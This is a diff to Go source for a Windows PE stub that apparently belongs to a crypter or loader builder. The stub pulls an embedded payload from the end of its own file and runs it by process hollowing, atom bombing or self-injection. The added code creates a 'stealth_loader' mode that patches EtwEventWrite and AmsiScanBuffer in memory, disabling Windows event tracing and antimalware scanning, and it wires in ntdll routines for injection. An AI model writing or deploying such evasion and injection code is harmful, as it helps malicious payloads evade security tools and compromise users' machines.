@@ -27,6 +27,8 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
+	"runtime/debug"
 	"strings"
 	"syscall"
 	"time"
@@ -40,16 +42,18 @@ var peEmbeddedArgs []string
 
 // Windows API
 var (
-	kernel32            = syscall.NewLazyDLL("kernel32.dll")
-	ntdll               = syscall.NewLazyDLL("ntdll.dll")
-	shell32             = syscall.NewLazyDLL("shell32.dll")
-	advapi32            = syscall.NewLazyDLL("advapi32.dll")
-	user32              = syscall.NewLazyDLL("user32.dll")
+	kernel32 = syscall.NewLazyDLL("kernel32.dll")
+	ntdll    = syscall.NewLazyDLL("ntdll.dll")
+	shell32  = syscall.NewLazyDLL("shell32.dll")
+	advapi32 = syscall.NewLazyDLL("advapi32.dll")
+	user32   = syscall.NewLazyDLL("user32.dll")
+	amsi     = syscall.NewLazyDLL("amsi.dll")
 
 	procCreateProcess    = kernel32.NewProc("CreateProcessW")
 	procVirtualAllocEx   = kernel32.NewProc("VirtualAllocEx")
 	procWriteProcessMem  = kernel32.NewProc("WriteProcessMemory")
 	procVirtualAlloc     = kernel32.NewProc("VirtualAlloc")
+	procVirtualProtect   = kernel32.NewProc("VirtualProtect")
 	procReadProcessMem   = kernel32.NewProc("ReadProcessMemory")
 	procGetThreadCtx     = kernel32.NewProc("GetThreadContext")
 	procSetThreadCtx     = kernel32.NewProc("SetThreadContext")
@@ -64,11 +68,19 @@ var (
 	procGlobalAddAtom    = kernel32.NewProc("GlobalAddAtomW")
 	procGlobalGetAtom    = kernel32.NewProc("GlobalGetAtomNameW")
 	procGlobalDeleteAtom = kernel32.NewProc("GlobalDeleteAtom")
-	procCreateThread     = kernel32.NewProc("CreateThread")
+	procCreateThread        = kernel32.NewProc("CreateThread")
 	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
-	procCloseHandle      = kernel32.NewProc("CloseHandle")
-	procLoadLibraryA     = kernel32.NewProc("LoadLibraryA")
-	procGetProcAddress   = kernel32.NewProc("GetProcAddress")
+	procCloseHandle         = kernel32.NewProc("CloseHandle")
+	procLoadLibraryA        = kernel32.NewProc("LoadLibraryA")
+	procGetProcAddress      = kernel32.NewProc("GetProcAddress")
+	procEtwEventWrite       = ntdll.NewProc("EtwEventWrite")
+	procAmsiScanBuffer      = amsi.NewProc("AmsiScanBuffer")
+
+	procNtAllocateVirtualMemory = ntdll.NewProc("NtAllocateVirtualMemory")
+	procNtProtectVirtualMemory  = ntdll.NewProc("NtProtectVirtualMemory")
+	procNtCreateThreadEx        = ntdll.NewProc("NtCreateThreadEx")
+	procNtWaitForSingleObject   = ntdll.NewProc("NtWaitForSingleObject")
+	procNtClose                 = ntdll.NewProc("NtClose")
 
 	procRegisterClassEx  = user32.NewProc("RegisterClassExW")
 	procCreateWindowEx   = user32.NewProc("CreateWindowExW")
@@ -80,6 +92,12 @@ var (
 	procPostQuitMessage  = user32.NewProc("PostQuitMessage")
 	procDestroyWindow    = user32.NewProc("DestroyWindow")
 )
+
+var (
+	etwPatched  bool
+	amsiPatched bool
+)
+
 
 func main() {
 	// 1. Read metadata and payload from end of file: [payload][metadata][metadata_size:8]
@@ -138,8 +156,11 @@ func main() {
 	switch mode {
 	case "process_hollowing", "auto":
 		executeProcessHollowing(payload)
-	case "atomic_bombing":
-		executeAtomicBombing(payload)
+case "atomic_bombing":
+	executeAtomicBombing(payload)
+case "stealth_loader":
+	disableStealthGuards()
+	executeStealthLoader(payload)
 	case "self_injection":
 		executeSelfInjection(payload)
 	case "", "off":
@@ -393,6 +414,67 @@ func cleanupTempFile(path string) {
 	}
 }
 
+func disableStealthGuards() {
+	disableETW()
+	disableAMSI()
+}
+
+func disableETW() {
+	if etwPatched || runtime.GOARCH != "amd64" {
+		return
+	}
+	addr := procEtwEventWrite.Addr()
+	if addr == 0 {
+		return
+	}
+	if patchMemory(addr, []byte{0xC3}) {
+		etwPatched = true
+	}
+}
+
+func disableAMSI() {
+	if amsiPatched || runtime.GOARCH != "amd64" {
+		return
+	}
+	if err := amsi.Load(); err != nil {
+		return
+	}
+	addr := procAmsiScanBuffer.Addr()
+	if addr == 0 {
+		return
+	}
+	if patchMemory(addr, []byte{0x31, 0xC0, 0xC3}) {
+		amsiPatched = true
+	}
+}
+
+func patchMemory(addr uintptr, patch []byte) bool {
+	if addr == 0 || len(patch) == 0 {
+		return false
+	}
+	var oldProtect uint32
+	ret, _, _ := procVirtualProtect.Call(
+		addr,
+		uintptr(len(patch)),
+		0x40,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if ret == 0 {
+		return false
+	}
+	for i := 0; i < len(patch); i++ {
+		ptr := (*byte)(unsafe.Pointer(addr + uintptr(i)))
+		*ptr = patch[i]
+	}
+	procVirtualProtect.Call(
+		addr,
+		uintptr(len(patch)),
+		uintptr(oldProtect),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	return true
+}
+
 func parseUserParams(raw string) []string {
 	raw = strings.TrimSpace(raw)
 	if raw == "" {
@@ -541,11 +623,19 @@ func isProcessElevated() bool {
 `
 
 // GetPEStubSource ritorna il codice sorgente dello stub PE
-func GetPEStubSource() string {
+func GetPEStubSource(arch string) string {
+	if arch == "386" {
+		replacer := strings.NewReplacer(
+			peProcessHollowingPlaceholder, "func executeProcessHollowing(payload []byte) { executeSelfInjection(payload) }\n",
+			peAtomicBombingPlaceholder, "func executeAtomicBombing(payload []byte) { executeSelfInjection(payload) }\n",
+			peSelfInjectionPlaceholder, winstrat.SelfInjectionRuntime32,
+		)
+		return replacer.Replace(PEStubSource)
+	}
 	replacer := strings.NewReplacer(
 		peProcessHollowingPlaceholder, winstrat.ProcessHollowingRuntime,
 		peAtomicBombingPlaceholder, winstrat.AtomicBombingRuntime,
-		peSelfInjectionPlaceholder, winstrat.SelfInjectionRuntime,
+		peSelfInjectionPlaceholder, winstrat.SelfInjectionRuntime64,
 	)
 	return replacer.Replace(PEStubSource)
 }
